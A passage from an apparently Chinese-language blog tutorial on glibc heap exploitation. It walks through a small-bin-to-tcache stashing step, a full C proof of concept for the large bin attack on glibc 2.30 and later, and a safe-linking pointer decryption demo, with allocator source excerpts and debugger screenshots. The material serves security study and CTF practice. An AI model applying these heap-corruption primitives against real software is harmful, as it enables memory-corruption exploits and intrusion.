<p>目标地址的 <code>stack_var_bk == stack_var_fd</code>，为了后续将 <code>fake_chunk</code> 的 <code>bk</code> 指针指向一块可写的内存，绕过 <code>glibc</code> 在摘链表时候的检查，样例中我们在 <code>small_bin</code> 中摘取两个 <code>chunk</code> 放入 <code>tcache</code> ，<code>tcache</code>便已经满了，不会再去索取 <code>fake_chunk_bk</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140157626.png"
                      alt="image-20231015140157626"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140331259.png"
                      alt="image-20231015140331259"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140509323.png"
                      alt="image-20231015140509323"
                ></p>
<p>申请 <code>9</code> 个 <code>0x90</code> 大小的 <code>chunk</code>，将 <code>3~8</code> 这 <code>6</code> 个 <code>chunk</code> 放进 <code>tcache</code> 中， 然后依次释放 <code>1,0,2</code> 三个 <code>chunk</code>，<code>1</code> 将会进入 <code>tcache</code> 中，<code>0,2</code> 进入 <code>unsorted</code>，因为不相邻，所以不会触发合并。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140538358.png"
                      alt="image-20231015140538358"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140650996.png"
                      alt="image-20231015140650996"
                ></p>
<p><code>malloc(0xa0)</code> 将会触发整理机制，将 <code>unsorted_bin</code> 中的 <code>chunk</code> 放进 <code>small_bin</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140716845.png"
                      alt="image-20231015140716845"
                ></p>
<p>接下来在 <code>tcache</code> 中腾出两个位置，为后续放入 <code>small_bin chunk</code> 做准备。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140815350.png"
                      alt="image-20231015140815350"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140838808.png"
                      alt="image-20231015140838808"
                ></p>
<p>将 <code>small_bin</code> 中倒数第二个 <code>chunk_bk</code> 指向 <code>stack_var</code>，为后续将 <code>chunk</code> 放入 <code>tcache</code> 中做索引。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141053095.png"
                      alt="image-20231015141053095"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141310006.png"
                      alt="image-20231015141310006"
                ></p>
<p>利用 <code>calloc(1,0x90)</code> 将 <code>small_bin</code> 中最后一个 <code>chunk</code> 拿出来，然后触发整理机制，将 <code>small_bin</code> 中剩余的 <code>chunk</code> 倒序取出放入 <code>tcache</code>，也就是按 <code>bk</code> 去索引。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141338609.png"
                      alt="image-20231015141338609"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141353825.png"
                      alt="image-20231015141353825"
                ></p>
<p>此时再次申请将会把目标地址的<code>fake_chunk</code>申请出来。</p>
<h1 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h1><h2 id="large-bin-attack-glibc-2-29"><a href="#large-bin-attack-glibc-2-29" class="headerlink" title="large_bin_attack (glibc &gt; 2.29)"></a>large_bin_attack (glibc &gt; 2.29)</h2><p>本次使用 <code>ubuntu:20.04</code> 。</p>
<h3 id="源码-24"><a href="#源码-24" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h3><p><code>glibc-2.30</code> 新增了两道检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// largebin_chunk-&gt;bk_nextsize-&gt;fd_nextszie != largebin_chunk</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line"><span class="comment">// largebin_chunk-&gt;bk-&gt;fd != largebin_chunk</span></span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">	<span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>利用代码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) <span class="built_in">chunksize_nomask</span> (bck-&gt;bk)) &#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-24"><a href="#调试-24" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015202953631.png"
                      alt="image-20231015202953631"
                ></p>
<p>布置堆结构如上，图中从上到下<code>chunk</code>分别为 <code>p1, g1, p2, g2</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203107725.png"
                      alt="image-20231015203107725"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203416086.png"
                      alt="image-20231015203416086"
                ></p>
<p>将 <code>chunk_p1</code> 放进 <code>largebin</code>，将 <code>chunk_p2</code> 放进 <code>unsorted_bin</code>，<code>(largebin)p1_size &gt; (unsorted)p2_size</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203720711.png"
                      alt="image-20231015203720711"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203842452.png"
                      alt="image-20231015203842452"
                ></p>
<p>修改<code>p1_bk_nextsize = target-0x20</code>，也就是<code>fake_chunk_fd_nextsize</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015204330313.png"
                      alt="image-20231015204330313"
                ></p>
<p>然后申请 <code>0x438</code> 大小的 <code>chunk</code>，触发整理机制将 <code>chunk_p2</code> 链接进 <code>largebin</code>，因为 <code>p2_size &lt; (largebin_least)p1</code>，会触发如下代码。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// victim:p2, fwd:largebin表头, bck:largebin_least_chunk(p1)</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) <span class="built_in">chunksize_nomask</span> (bck-&gt;bk)) &#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk; </span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p><code>p2-&gt;fd_nextsize = p1; </code></p>
</li>
<li><p><code>p2-&gt;bk_nextsize = (target-0x20)p1-&gt;bk_nextsize;</code></p>
</li>
<li><p><code>(target-0x20)p1-&gt;bk_nextsize = p2;</code></p>
</li>
</ol>
<p> 第三步时将 <code>(target)fake_chunk_fd_nextsize</code> 改为了 <code>p2_prev</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015204706099.png"
                      alt="image-20231015204706099"
                ></p>
<p>最后目标地址被成功修改为一个堆地址。</p>
<h2 id="decrypt-safe-linking-glibc-2-31"><a href="#decrypt-safe-linking-glibc-2-31" class="headerlink" title="decrypt_safe_linking(glibc &gt; 2.31)"></a>decrypt_safe_linking(glibc &gt; 2.31)</h2><p>本次使用 <code>ubuntu:22.04</code> 进行编译。</p>
<h3 id="源码-25"><a href="#源码-25" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">decrypt</span><span class="params">(<span class="type">long</span> cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;because of the 12bit sliding.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)&quot;</span>);</span><br><span class="line">	<span class="type">long</span> key = <span class="number">0</span>;</span><br><span class="line">	<span class="type">long</span> plain;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">		<span class="type">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line">		<span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">		plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">		key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;round %d:\n&quot;</span>, i);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>, key);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>, plain);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>, cipher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This technique demonstrates how to recover the original content from a poisoned</span></span><br><span class="line"><span class="comment">	 * value because of the safe-linking mechanism.</span></span><br><span class="line"><span class="comment">	 * The attack uses the fact that the first 12 bit of the plaintext (pointer) is known</span></span><br><span class="line"><span class="comment">	 * and the key (ASLR slide) is the same to the pointer&#x27;s leading bits.</span></span><br><span class="line"><span class="comment">	 * As a result, as long as the chunk where the pointer is stored is at the same page</span></span><br><span class="line"><span class="comment">	 * of the pointer itself, the value of the pointer can be fully recovered.</span></span><br><span class="line"><span class="comment">	 * Otherwise, we can also recover the pointer with the page-offset between the storer</span></span><br><span class="line"><span class="comment">	 * and the pointer. What we demonstrate here is a special case whose page-offset is 0.</span></span><br><span class="line"><span class="comment">	 * For demonstrations of other more general cases, plz refer to</span></span><br><span class="line"><span class="comment">	 * https://github.com/n132/Dec-Safe-Linking</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 1: allocate chunks</span></span><br><span class="line">	<span class="type">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="type">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;First, we create chunk a @ %p and chunk b @ %p\n&quot;</span>, a, b);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And then create a padding chunk to prevent consolidation.&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 2: free chunks</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free chunk a and then free chunk b.&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the freelist is: [%p -&gt; %p]\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Due to safe-linking, the value actually stored at b[0] is: %#lx\n&quot;</span>, b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 3: recover the values</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now decrypt the poisoned value&quot;</span>);</span><br><span class="line">	<span class="type">long</span> plaintext = <span class="built_in">decrypt</span>(b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;value: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;recovered value: %#lx\n&quot;</span>, plaintext);</span><br><span class="line">	<span class="built_in">assert</span>(plaintext == (<span class="type">long</span>)a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-3"><a href="#基础知识-3" class="headerlink" title="基础知识"></a>基础知识</h3><p>对 <code>tcache_next(fd)</code> 新增检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加密</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 原理: A:fd;B:(pos&gt;&gt;12);C:(ptr); A=B^C; C=A^B;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/eg.png"
                      alt="eg"
                ></p>
<p><code>P</code> 表示将保存在空闲块的 <code>fd</code> 字段中的指针值。<code>L</code> 表示 <code>fd</code> 字段本身的地址。<code>L&gt;&gt;12</code>是 <code>L</code> 的右移值，用于对 <code>P</code> 进行异或运算，从而产生一个编码指针<code>P&#39;</code>。<code>Safe Linking</code> 将这个<code>P&#39;</code>值存储在 <code>fd</code> 字段中。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094308974.png"
                      alt="image-20231016094308974"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094240180.png"
                      alt="image-20231016094240180"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094355521.png"
                      alt="image-20231016094355521"
                ></p>
